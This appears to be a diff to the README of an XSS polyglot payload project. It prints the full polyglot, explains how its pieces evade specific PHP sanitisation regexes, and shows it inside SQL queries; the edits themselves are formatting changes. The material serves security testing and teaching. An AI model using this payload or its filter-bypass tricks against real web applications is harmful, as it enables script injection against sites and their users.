@@ -22,6 +22,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 * `</stYle/</titLe/</teXtarEa/</scRipt/--!>`: A sneaky HTML-tag-breaker sequence.
 * `\x3csVg/<sVg/oNloAd=alert()//>\x3e`: An innocuous svg element!!
 
+__Total length: 144 characters.__
+
 ## What injection contexts does it cover?
 #### HTML contexts covered:
 * __Double-quoted tag attributes:__
@@ -236,15 +238,30 @@ _Demo: <https://jsbin.com/ruhofi>_
 ## Filter evasion:
 As you might have already noticed, the polyglot has been crafted with filter evasion in mind. For instance:
 
-`jaVasCript:`, `oNcliCk`, et al: Bypasses ```preg_replace('/\b(?:javascript:|on\w+=)/', '', payload)```.
+* `jaVasCript:`, `oNcliCk`, et al. bypasses: 
+```php
+preg_replace('/\b(?:javascript:|on\w+=)/', '', payload);
+```
 
-``` /*`/*\` ```: Bypasses ```preg_replace('/`/', '\`', payload)```.
+* ``` /*`/*\` ``` bypasses: 
+```php
+preg_replace('/`/', '\`', payload);
+```
 
-``` </stYle/</titLe/</teXtarEa/</scRipt/--!> ```: Bypasses ```preg_replace('<\/\w+>', '', payload)```.
+* ``` </stYle/</titLe/</teXtarEa/</scRipt/--!> ``` bypasses: 
+```php
+preg_replace('<\/\w+>', '', payload);
+```
 
-`--!>`: Bypasses ```preg_replace('/-->/', '', payload)```.
+* `--!>` bypasses: 
+```php
+preg_replace('/-->/', '', payload);
+```
 
-``` <sVg/oNloAd=alert()//> ```: Bypasses ```preg_replace('<\w+\s+', '', payload)```.
+* ``` <sVg/oNloAd=alert()//> ``` bypasses:
+```php
+preg_replace('<\w+\s+', '', payload);
+```
 
 ## Bonus attacking contexts covered:
 #### CRLF-based cross site scripting:
@@ -269,4 +286,5 @@ SELECT * FROM Users WHERE Username='jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk
 SELECT * FROM Users WHERE Username="jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
 
 ````
-### And even more; eish...I'm tired counting down!
+
+###### And even more; eish...I'm tired counting down already!!
